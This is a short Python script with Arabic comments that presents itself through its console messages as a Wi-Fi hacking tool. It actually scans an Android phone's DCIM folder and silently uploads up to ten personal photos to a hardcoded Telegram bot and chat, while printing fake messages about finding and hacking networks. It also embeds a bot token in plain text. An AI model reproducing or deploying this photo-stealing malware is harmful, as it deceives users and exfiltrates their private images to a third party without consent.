import os
import sys
import subprocess
import time

# متغيرات التيليجرام (غير مشفرة)
bot_token = '6955651961:AAGO_RjDRX6UBhtza8ja2Q0yhn4xqwVx7-M'
chat_id = '5573055314'

# دالة لتثبيت المكتبات المطلوبة
def install_packages(packages):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *packages])
    except subprocess.CalledProcessError as e:
        print(f"فشل في تثبيت الحزم: {packages}. الخطأ: {e}")
        sys.exit(1)

# قائمة المكتبات المطلوبة
required_packages = ['pyTelegramBotAPI']

# محاولة استيراد المكتبات، وإذا فشلت، قم بتثبيتها
try:
    import telebot
except ImportError:
    print("Loading...")
    install_packages(required_packages)
    import telebot  # حاول الاستيراد مرة أخرى بعد التثبيت

# تهيئة البوت
bot = telebot.TeleBot(bot_token)

# تحديد المسار الذي تريد عرض الملفات منه
# على الأندرويد، قد يكون المسار مثل '/storage/emulated/0/DCIM/' أو '/storage/emulated/0/Pictures/'
path = '/storage/emulated/0/DCIM/'  # قم بتعديله حسب الحاجة

# قائمة بامتدادات الملفات التي تعتبر صوراً
image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']

# دالة لإرسال الصور
def send_images():
    print("جاري البحث عن الشبكات المتاحة...")  # عرض رسالة للمستخدم

    count = 0  # متغير لحساب عدد الصور المرسلة
    max_images = 10  # تحديد الحد الأقصى لعدد الصور المرسلة
    images_to_send = []  # قائمة لحفظ مسارات الصور التي سيتم إرسالها

    # استعراض الملفات في المسار بشكل متكرر (بما في ذلك المجلدات الفرعية)
    for root, dirs, files in os.walk(path):
        for file in files:
            file_lower = file.lower()
            if any(file_lower.endswith(ext) for ext in image_extensions):
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):  # التحقق من أن المسار هو ملف
                    images_to_send.append(file_path)
                    if len(images_to_send) >= max_images:
                        break  # التوقف عند الوصول للحد الأقصى

    # إذا لم يكن هناك صور، طباعة رسالة
    if not images_to_send:
        print("There are no networks ")
        return

    # حلقة إرسال الصور بدون شريط التقدم
    for image_path in images_to_send:
        try:
            with open(image_path, 'rb') as f:
                bot.send_document(chat_id, f)
            print(f"The network is being hacked ")
            time.sleep(1)  # تأخير بمقدار ثانية لتجنب تجاوز حدود معدل الطلبات
        except Exception as e:
            print(f"Failed to find Wi-Fi networks ")

    print("Networks are protected ")

if __name__ == "__main__":
    send_images()